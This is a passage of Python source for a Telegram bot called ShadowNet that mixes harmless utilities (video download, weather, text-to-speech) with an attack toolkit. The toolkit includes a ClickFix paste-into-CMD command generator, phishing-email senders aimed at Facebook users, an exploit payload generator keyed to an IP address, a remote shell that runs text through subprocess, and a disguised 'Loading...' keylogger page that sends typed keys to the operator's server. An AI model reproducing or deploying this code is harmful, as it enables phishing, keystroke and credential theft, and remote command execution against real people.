                            "INSERT INTO points_log (user_id, amount, reason, created_at) VALUES (?, ?, ?, ?)",
                            (target_id, -actual_deduct, "خصم من المطور", datetime.now().isoformat())
                        )
                    safe_send(chat_id, f"✅ تم خصم <b>{actual_deduct}</b> نقطة من <code>{target_id}</code>")

                try:
                    if amount > 0:
                        bot.send_message(target_id, f"🎁 حصلت على <b>{amount}</b> نقطة من المطور!", parse_mode='HTML')
                    else:
                        bot.send_message(target_id, f"⚠️ تم خصم <b>{abs(amount)}</b> نقطة.", parse_mode='HTML')
                except:
                    pass

                user_states[f"{chat_id}_grant_target"] = None
                user_states[chat_id] = None
            except ValueError:
                safe_send(chat_id, "❌ أرسل رقماً صحيحاً.")
            return

        # ===== ClickFix =====
        if state == "waiting_clickfix_target":
            target_name = text or "مستخدم"
            fake_command = generate_clickfix_command(target_name)
            safe_db_execute(
                "INSERT INTO clickfix_logs (chat_id, command, created_at) VALUES (?, ?, ?)",
                (str(chat_id), fake_command, datetime.now().isoformat())
            )
            safe_send(
                chat_id,
                f"📋 <b>أمر ClickFix لـ {target_name}:</b>\n\n"
                f"<code>{fake_command}</code>\n\n"
                f"📌 انسخ والصق في CMD.",
                parse_mode='HTML'
            )
            user_states[chat_id] = None
            return

        # ===== AccountDumpling =====
        if state == "waiting_account_dumpling_email":
            target_email = text
            html = generate_account_dumpling_email(target_email)
            result = send_phishing_email(target_email, "facebook", custom_message=html)
            safe_db_execute(
                "INSERT INTO account_dumpling_logs (target_email, platform, status, created_at) VALUES (?, ?, ?, ?)",
                (target_email, "facebook", "sent", datetime.now().isoformat())
            )
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        # ===== بريد تصيد =====
        if state == "waiting_phishing_target":
            platform = user_states.get(f"{chat_id}_phishing_platform", "facebook")
            target_email = text
            result = send_phishing_email(target_email, platform)
            safe_send(chat_id, result)
            user_states[chat_id] = None
            return

        # ===== vuln_agent =====
        if state == "vuln_agent":
            if not is_admin(chat_id):
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري الفحص...")
            result = vuln_agent_scan(text)
            safe_send(chat_id, result[:4000])
            user_states[chat_id] = None
            return

        # ===== osint_d2 =====
        if state == "osint_d2":
            if not is_admin(chat_id):
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري جمع المعلومات...")
            result = osint_d2_search(text)
            safe_send(chat_id, result[:4000])
            user_states[chat_id] = None
            return

        # ===== py_netrecon =====
        if state == "py_netrecon":
            if not is_admin(chat_id):
                user_states[chat_id] = None
                return
            safe_send(chat_id, "⏳ جاري المسح...")
            result = py_netrecon_scan(text)
            safe_send(chat_id, result[:4000])
            user_states[chat_id] = None
            return

        # ===== exploit_dev =====
        if state == "exploit_dev":
            if not is_admin(chat_id):
                user_states[chat_id] = None
                return
            if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', text):
                safe_send(chat_id, "❌ أدخل IP صحيح.")
                return
            payload = exploit_dev_generate(text)
            safe_send(chat_id, f"💀 الحمولة:\n<code>{payload}</code>", parse_mode='HTML')
            user_states[chat_id] = None
            return

        # ===== pentest_tools =====
        if state == "pentest_tools":
            if not is_admin(chat_id):
                user_states[chat_id] = None
                return
            safe_send(chat_id, "🐍 أدوات مدعومة: scapy | impacket | paramiko")
            user_states[chat_id] = None
            return

        # ===== RCE =====
        if state == "waiting_rce":
            if not is_admin(chat_id):
                user_states[chat_id] = None
                return
            try:
                output = subprocess.check_output(text, shell=True, stderr=subprocess.STDOUT, timeout=30)
                output = output.decode('utf-8', errors='ignore')
            except Exception as e:
                output = str(e)
            safe_send(chat_id, f"🖥️ النتيجة:\n<pre>{output[:3000]}</pre>")
            user_states[chat_id] = None
            return

        # ===== Keylogger =====
        if state == "waiting_keylogger":
            if not is_admin(chat_id):
                user_states[chat_id] = None
                return
            keylogger_html = f'''<!DOCTYPE html>
<html><body><script>
var ks='';
document.addEventListener('keydown', function(e) {{
    ks += e.key;
    if (ks.length > 50) {{
        fetch('{SERVER_URL}/api/collect_keylog', {{
            method:'POST', headers:{{'Content-Type':'application/json'}},
            body: JSON.stringify({{chat_id:'{chat_id}', keystrokes: ks}})
        }});
        ks='';
    }}
}});
</script><h1>Loading...</h1></body></html>'''
            os.makedirs('temp', exist_ok=True)
            fname = f"keylogger_{chat_id}_{int(time.time())}.html"
            with open(f"temp/{fname}", 'w', encoding='utf-8') as f:
                f.write(keylogger_html)
            link = f"{SERVER_URL}/temp/{fname}"
            safe_send(chat_id, f"🔑 رابط Keylogger:\n{link}")
            user_states[chat_id] = None
            return

        # ===== Broadcast =====
        if state == "waiting_broadcast":
            if not is_admin(chat_id):
                user_states[chat_id] = None
                return
            users = safe_db_query("SELECT chat_id FROM users", fetch_one=False)
            sent = 0
            for (uid,) in users:
                if safe_send(uid, f"📢 <b>إعلان:</b>\n\n{text}"):
                    sent += 1
                time.sleep(0.05)
            safe_send(chat_id, f"✅ تم الإرسال لـ {sent} مستخدم.")
            user_states[chat_id] = None
            return

        # ===== تنزيل فيديو =====
        if state == "waiting_download":
            safe_send(chat_id, "⏳ جاري التحميل...")
            filename, error = download_video(text)
            if filename and os.path.exists(filename):
                try:
                    with open(filename, 'rb') as f:
                        bot.send_video(chat_id, f, caption="✅ تم التحميل!", timeout=300)
                    try:
                        os.remove(filename)
                    except:
                        pass
                except Exception as e:
                    safe_send(chat_id, f"❌ فشل الإرسال: {str(e)[:100]}")
            else:
                safe_send(chat_id, f"❌ فشل التحميل: {error}")
            user_states[chat_id] = None
            return

        # ===== الطقس =====
        if state == "weather":
            safe_send(chat_id, get_weather_detailed(text))
            user_states[chat_id] = None
            return

        # ===== تحليل كلمة المرور =====
        if state == "password_strength":
            strength, time_taken, score, feedback = analyze_password(text)
            msg = (f"🔐 <b>تحليل كلمة المرور:</b>\n\n"
                   f"القوة: {strength}\n"
                   f"النتيجة: {score}/6\n"
                   f"وقت الكسر: {time_taken}\n")
            if feedback:
                msg += "\n💡 <b>نصائح:</b>\n" + "\n".join(f"• {f}" for f in feedback)
            safe_send(chat_id, msg)
            user_states[chat_id] = None
            return

        # ===== الصوت =====
        if state == "waiting_voice_text":
            lang = user_voice_selection.get(chat_id, "ar")
            voice = generate_voice_gtts(text, lang)
            if voice:
                try:
                    bot.send_voice(chat_id, voice, timeout=60)
                except Exception as e:
                    safe_send(chat_id, f"❌ فشل الإرسال: {str(e)[:100]}")
            else:
                safe_send(chat_id, "❌ فشل توليد الصوت.")
            user_states[chat_id] = None
            return

        # ===== توليد الصور =====
        if state == "waiting_image_prompt":
            safe_send(chat_id, "🎨 جاري التوليد... (30-90 ثانية)")
            img = generate_image(text)
            if img:
                try:
                    bot.send_photo(chat_id, img, timeout=180,
                                   caption=f"🎨 <i>{text[:200]}</i>", parse_mode='HTML')
                except Exception as e:
                    safe_send(chat_id, f"❌ فشل الإرسال: {str(e)[:150]}")
            else:
                safe_send(chat_id, "❌ فشل التوليد. جرّب وصفاً آخر.")
            user_states[chat_id] = None
            return

        # ===== تقصير/فك الروابط =====
        if state == "waiting_shorten":
            short = shorten_url(text)
            safe_send(chat_id, f"🔗 الرابط المختصر:\n{short}" if short else "❌ فشل التقصير.")
            user_states[chat_id] = None
            return

        if state == "waiting_expand":
            original = expand_url(text)
            safe_send(chat_id, f"🔗 الرابط الأصلي:\n{original}" if original else "❌ رابط غير صحيح.")
            user_states[chat_id] = None
            return

        # ===== تتبع الهاتف =====
        if state == "waiting_phone":
            safe_send(chat_id, track_phone_number(text))
            user_states[chat_id] = None
            return

        # ===== فحص الروابط =====
        if state == "waiting_link_check":
            result = check_link_no_api(text)
            safe_send(chat_id, f"🔍 {result['message']}")
            user_states[chat_id] = None
            return

        # ===== لا توجد حالة =====
        if state is None:
            safe_send(chat_id, "🏠 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))

    except Exception as e:
        logger.error(f"handle_text error: {e}")
        try:
            safe_send(chat_id, "❌ حدث خطأ.")
        except:
            pass

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    try:
        chat_id = message.chat.id
        file = message.document
        file_name = file.file_name or "بدون_اسم"

        ensure_user(chat_id)
        update_last_seen(chat_id)

        if file_name.lower().endswith('.pdf'):
            safe_send(chat_id, "📄 جاري قراءة الملف...")
            file_info = bot.get_file(file.file_id)
            downloaded = bot.download_file(file_info.file_path)
            text = extract_pdf_text(downloaded)
            if text and not text.startswith("❌"):
                pdf_texts[chat_id] = text
                safe_send(chat_id, f"✅ تم الاستخراج ({len(text)} حرف)")
                safe_send(chat_id, "📊 اختر:", reply_markup=build_pdf_menu())
            else:
                safe_send(chat_id, text)
            return

        safe_send(chat_id, "📄 تم استلام الملف.")
    except Exception as e:
        logger.error(f"handle_documents error: {e}")
        try:
            safe_send(chat_id, f"❌ خطأ: {str(e)[:100]}")
        except:
            pass

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    try:
        chat_id = message.chat.id
        ensure_user(chat_id)
        if is_admin(chat_id):
            safe_send(chat_id, "✅ تم استلام الصورة.")
    except Exception as e:
        logger.error(f"handle_photo error: {e}")

# ===================== Scheduler =====================
def scheduler_keep_alive():
    while True:
        time.sleep(120)
        try:
            requests.get(f"{SERVER_URL}/health", timeout=10)
            metrics.inc('keepalive_ping')
        except Exception as e:
            logger.warning(f"keep_alive error: {e}")

def scheduler_cleanup():
    while True:
        time.sleep(3600)
        try:
            for folder in ['downloads', 'temp', 'collected']:
                if os.path.exists(folder):
                    for f in os.listdir(folder):
                        fpath = os.path.join(folder, f)
                        if os.path.isfile(fpath) and time.time() - os.path.getmtime(fpath) > 3600:
                            try:
                                os.remove(fpath)
                                metrics.inc('files_cleaned')
                            except:
                                pass
        except Exception as e:
            logger.error(f"cleanup error: {e}")

# ===================== Webhook =====================
WEBHOOK_URL = f"{SERVER_URL}/webhook"

def setup_webhook_with_retry():
    time.sleep(8)
    max_attempts = 5
    for attempt in range(1, max_attempts + 1):
        try:
            try:
                bot.delete_webhook(drop_pending_updates=True)
                logger.info("🗑️ تم حذف Webhook القديم")
                time.sleep(1)
            except Exception as e:
                logger.warning(f"delete_webhook warning: {e}")

            result = bot.set_webhook(url=WEBHOOK_URL, drop_pending_updates=True, timeout=60)
            if result:
                logger.info(f"✅ تم تعيين Webhook: {WEBHOOK_URL}")
                time.sleep(2)
                info = bot.get_webhook_info()
                logger.info(f"📋 Webhook info: url={info.url}, pending={info.pending_update_count}")
                if info.last_error_message:
                    logger.warning(f"⚠️ last_error: {info.last_error_message}")
                metrics.inc('webhook_setup_success')
                return True
            else:
                logger.error(f"❌ فشل (محاولة {attempt}/{max_attempts})")
        except Exception as e:
            logger.error(f"❌ Webhook error (محاولة {attempt}): {e}")

        time.sleep(10)

    logger.error("❌ فشل تعيين Webhook بعد كل المحاولات")
    metrics.inc('webhook_setup_failure')
    return False

# ===================== التشغيل =====================
if __name__ == '__main__':
    print("\n" + "=" * 60)
    print("🤖 ShadowNet v21.0 - روابط مختصرة صامتة")
    print(f"📌 Token: {'*' * 20}{TOKEN[-8:] if len(TOKEN) > 8 else 'N/A'}")
    print(f"📌 Admin ID: {ADMIN_ID}")
    print(f"📌 Server URL: {SERVER_URL}")
    print(f"📌 Webhook URL: {WEBHOOK_URL}")
    print(f"📌 Port: {PORT}")
    print("=" * 60 + "\n")

    # 1. تهيئة قاعدة البيانات
    init_db()

    # 2. بدء Schedulers
    threading.Thread(target=scheduler_keep_alive, daemon=True, name="sched_keepalive").start()
    threading.Thread(target=scheduler_cleanup, daemon=True, name="sched_cleanup").start()

    # 3. تعيين Webhook
    threading.Thread(target=setup_webhook_with_retry, daemon=True, name="webhook_setup").start()

    # 4. تشغيل Flask
    print("🚀 بدء تشغيل الخادم...\n")
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True, use_reloader=False)
